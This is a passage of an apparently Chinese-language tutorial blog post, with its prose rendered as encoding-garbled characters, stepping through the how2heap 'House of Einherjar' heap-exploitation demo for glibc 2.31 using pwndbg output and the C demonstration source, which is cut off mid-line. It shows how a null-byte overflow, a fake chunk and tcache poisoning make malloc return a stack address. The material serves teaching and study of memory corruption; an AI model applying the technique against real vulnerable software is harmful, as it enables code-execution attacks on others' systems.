class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx b<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">1</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå½“æ‰§è¡Œå®Œä¹‹åï¼Œ c chunk çš„ prev_inused ä½å°†è¢«ç½®é›¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¼šå¯¼è‡´ chunk a è¢«è®¤ä¸ºæ˜¯ free çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Freed                <span class="number">0x0</span>               <span class="number">0x0</span></span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬åœ¨  chunk a çš„ä½ç½®æ”¾äº†ä¸€ä¸ª fake chunkï¼Œæˆ‘ä»¬æ­¤æ—¶ä¿®æ”¹äº† chunk cçš„size ä½ç½®ï¼ŒåŒæ—¶æˆ‘ä»¬éœ€è¦å…¶ prev_size åˆæ³•ï¼Œæ‰€ä»¥ä¹Ÿè¦ä¿®æ”¹ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">83</span>     <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="number">84</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">  <span class="number">85</span>            <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="number">86</span>     <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">â–º <span class="number">87</span>     <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="number">88</span>     *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°† chunk bçš„preve size ä¿®æ”¹ä¸º 0x60</p><p>ç´§æ¥ç€ï¼Œç…§æ ·å¡«æ»¡ tcache,  ç„¶åæˆ‘ä»¬å»free chunk cï¼Œç”±äº chunk c çš„ prev_inused ä¸º0ï¼Œåˆ™è®¤ä¸ºå‰é¢çš„ chunk æ˜¯free çš„æ­¤æ—¶ä¼šæœ‰ä¸€ä¸ªå‘å‰åˆå¹¶çš„è¿‡ç¨‹,è¿™æ ·æˆ‘ä»¬å°±ä¼šæœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘ fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rdi  <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x5555555592a8</span> â—‚â€” <span class="number">0x161</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x5555555592b0</span> â€”â–¸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) â€”â–¸ <span class="number">0x555555559b00</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x5555555592c0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">... â†“</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x5555555592d8</span> â—‚â€” <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x5555555592a0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ­¤æ—¶å† malloc ä¸€ä¸ª 0x158 å¤§å°çš„chunk ï¼Œåˆå¹¶åå¤§å°ä¸º 0x160, ç„¶åæ­¤æ—¶ åˆå¹¶åçš„ chunk å°±ä¼šè¢«æ•´å—å–å‡º,  </p><p>ç„¶åæˆ‘ä»¬åœ¨è¿›è¡Œå¦‚ä¸‹æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">119</span>     <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">120</span>     <span class="built_in">free</span>(pad);</span><br><span class="line">  <span class="number">121</span></span><br><span class="line">â–º <span class="number">122</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="number">123</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶  chunk b ä¹Ÿä¼šåŠ å…¥åˆ°  tcache biné‡Œï¼Œä¸”æŒ‡å‘äº†åˆš free çš„ pad chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">25</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;\020\233UUUU&quot;</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">2</span>]: <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x555555559b10</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">7</span>]: <span class="number">0x555555559a10</span> â€”â–¸ <span class="number">0x555555559910</span> â€”â–¸ <span class="number">0x555555559810</span> â€”â–¸ <span class="number">0x555555559710</span> â€”â–¸ <span class="number">0x555555559610</span> â€”â–¸ <span class="number">0x555555559510</span> â€”â–¸ <span class="number">0x555555559410</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure><p>ç”±äºï¼Œ chunk d å¯å¯¹ chunkbè¿›è¡Œä»»æ„ä¿®æ”¹ ï¼ˆå †å—é‡å äº†ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000161</span>      =====&gt; chunk d</span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>      =====&gt; fake chunk <span class="keyword">and</span> chunk b</span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559010</span>         ----&gt; chunk b fd -&gt; <span class="number">0x0000555555559b10</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span>      =====&gt; chunk c</span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹ chunk d çš„å†…å®¹æ¥è¾¾åˆ° ä¿®æ”¹ chunk b çš„ fd æŒ‡é’ˆçš„ç›®çš„ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">   <span class="number">126</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">127</span>     d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line">   <span class="number">128</span></span><br><span class="line">   <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line"> â–º <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">   <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line">   <span class="number">134</span></span><br><span class="line">   <span class="number">135</span>     <span class="comment">// sanity check</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ rsp  <span class="number">0x7fffffffe210</span> â—‚â€” <span class="number">0x700000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>â”‚      <span class="number">0x7fffffffe218</span> â—‚â€” <span class="number">0x2800000007</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>â”‚      <span class="number">0x7fffffffe220</span> â€”â–¸ <span class="number">0x5555555592a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>â”‚      <span class="number">0x7fffffffe228</span> â€”â–¸ <span class="number">0x5555555592e0</span> â€”â–¸ <span class="number">0x7fffffffe260</span> â€”â–¸ <span class="number">0x555555554040</span> â—‚â€” <span class="number">0x400000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>â”‚      <span class="number">0x7fffffffe230</span> â€”â–¸ <span class="number">0x555555559310</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>â”‚      <span class="number">0x7fffffffe238</span> â€”â–¸ <span class="number">0x555555559308</span> â—‚â€” <span class="number">0x100</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>â”‚      <span class="number">0x7fffffffe240</span> â—‚â€” <span class="number">0x60</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>â”‚      <span class="number">0x7fffffffe248</span> â€”â–¸ <span class="number">0x5555555592b0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line"> â–º f <span class="number">0</span>     <span class="number">55555555571</span>e main+<span class="number">1269</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x00007fffffffe260</span><span class="number">0x0000555555559010</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure><p>æœ€åæˆ‘ä»¬åªéœ€ä¸¤æ¬¡ malloc å°±èƒ½æ‹¿åˆ°ç›®æ ‡åœ°å€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line">  <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">â–º <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç å¦‚ä¸‹:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, 